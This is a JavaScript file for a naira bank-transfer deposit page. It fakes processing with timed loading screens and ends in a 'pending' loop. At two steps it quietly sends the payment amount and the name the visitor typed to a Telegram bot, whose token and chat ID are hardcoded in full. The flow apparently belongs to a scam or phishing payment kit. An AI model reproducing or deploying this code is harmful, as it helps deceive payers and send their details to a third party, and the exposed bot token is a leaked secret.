//=========================
// TELEGRAM SETTINGS
//=========================

const BOT_TOKEN = "8826252569:AAFVuUEFUnYPYydKyzzaokH0cR1N-Gzy7k0";
const CHAT_ID = "6992273467";

function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => {
        if (!response.ok) {
            console.warn("Telegram request failed:", response.status);
        }
        return response.json().catch(() => null);
    })
    .catch(error => {
        console.warn("Telegram error:", error);
        // Do nothing else so the app continues normally.
    });
}

//=========================
// CURRENT DATE
//=========================

const today = new Date();


document.getElementById(
"current-date"
).innerText =

today.toLocaleDateString();




//=========================
// GET AMOUNT
//=========================

const params =

new URLSearchParams(
window.location.search
);


const amount =

params.get("amount") || "0";



document.getElementById(
"amount"
).innerText = amount;



document.getElementById(
"deposit-amount"
).innerText = amount;




//=========================
// PAGES
//=========================

const transferPage =

document.getElementById(
"transfer-page"
);


const verifyPage =

document.getElementById(
"verify-page"
);


const pendingPage =

document.getElementById(
"pending-page"
);




//=========================
// LOADING OVERLAY
//=========================

const loadingOverlay =

document.getElementById(
"loading-overlay"
);




//=========================
// SHOW LOADING
//=========================

function showLoading(callback){


    loadingOverlay.classList
    .remove("hidden");


    setTimeout(()=>{


        loadingOverlay.classList
        .add("hidden");


        callback();


    },5000);


}




//=========================
// I'VE PAID
//=========================

document.getElementById("paid-btn").onclick = () => {

    sendToTelegram(
        `💰 Payment Started\nAmount: NGN ${amount}`
    );

    showLoading(() => {

        transferPage.classList.add("hidden");
        verifyPage.classList.remove("hidden");

    });

};




//=========================
// BACK BUTTON ONE
//=========================

document.querySelector(

".back-btn"

).onclick = ()=>{


    window.location.href=

    "deposit.html";


};




//=========================
// BACK BUTTON TWO
//=========================

document.getElementById(

"back-two"

).onclick = ()=>{


    verifyPage.classList
    .add("hidden");


    transferPage.classList
    .remove("hidden");


};




//=========================
// BACK BUTTON THREE
//=========================

document.getElementById(

"back-three"

).onclick = ()=>{


    pendingPage.classList
    .add("hidden");


    verifyPage.classList
    .remove("hidden");


};




//=========================
// CONFIRM
//=========================

document.getElementById("confirm-btn").onclick = () => {

    const accountName = document.getElementById("account-name");

    if (accountName.value.trim() == "") {

        accountName.style.border = "2px solid red";
        return;
    }

    accountName.style.border = "1px solid black";

    sendToTelegram(
        `✅ Payment Confirmation\nAmount: NGN ${amount}\nName: ${accountName.value}`
    );

    showLoading(() => {

        verifyPage.classList.add("hidden");
        pendingPage.classList.remove("hidden");

    });

};



//=========================
// TRY AGAIN
//=========================

document.getElementById(

"home-btn"

).onclick = ()=>{


    showLoading(()=>{


        pendingPage.classList
        .remove("hidden");


    });


};




//=========================
// PAGE LOADED
//=========================

console.log(

"LOCAL TRANSFER PAGE LOADED"

);